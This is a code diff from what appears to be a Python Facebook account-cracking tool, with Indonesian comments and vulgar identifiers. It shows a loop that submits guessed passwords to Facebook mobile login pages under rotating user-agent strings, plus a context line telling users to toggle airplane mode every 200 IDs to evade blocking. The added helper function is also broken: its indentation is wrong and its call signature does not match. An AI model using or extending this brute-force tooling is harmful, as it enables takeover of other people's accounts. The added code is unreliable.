@@ -380,6 +380,14 @@ PROSES NGEHEK FB, MAINKAN MODE PESAWAT SETIAP 200 ID!
                                 bool.submit(self.kontol_kuda, user.split("<=>")[0], pwek, xx)
                         exit("\n\ncracking done!")
                 else:continue
+                
+    def ua_asu(afile):
+        line = next(afile)
+        for num, aline in enumerate(afile, 2):
+            if random.randrange(num):
+            continue
+            line = aline
+        return line
 
     def carckk(self, kntd):
         self.apk()
@@ -480,7 +488,7 @@ PROSES NGEHEK FB, MAINKAN MODE PESAWAT SETIAP 200 ID!
         for password in pasw:
             try:
                 ses=requests.Session()
-                uas=random.choice(open('/storage/emulated/0/Download/dalvik.txt').readlines())
+                uas=self.ua_asu("/storage/emulated/0/Download/dalvik.txt")
                 if "acy" in kntd:
                     urll = "https://m.alpha.facebook.com/login.php?"
                     heaq = ({"connection": "keep-alive", "accept-language": "id,en-US;q=0.9,en;q=0.8", "sec-fetch-mode": "navigate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "sec-fetch-sest": "document", "sec-fetch-site": "none", "cache-control": "max-age=0", "sec-fetch-user": "?1", "upgrade-insecure-requests": "1", "host": "m.alpha.facebook.com", "user-agent": uas})
